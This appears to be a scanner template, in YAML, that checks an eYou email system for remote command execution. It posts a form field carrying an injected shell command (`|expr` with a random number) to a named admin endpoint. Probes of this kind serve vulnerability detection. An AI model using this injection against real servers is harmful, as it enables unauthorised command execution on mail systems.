cve-id: eyou-emailsystem-rce
set:
  r1: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /webadm/?q=moni_detail.do&action=gragh
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      type='|expr%20{{r1}}||'
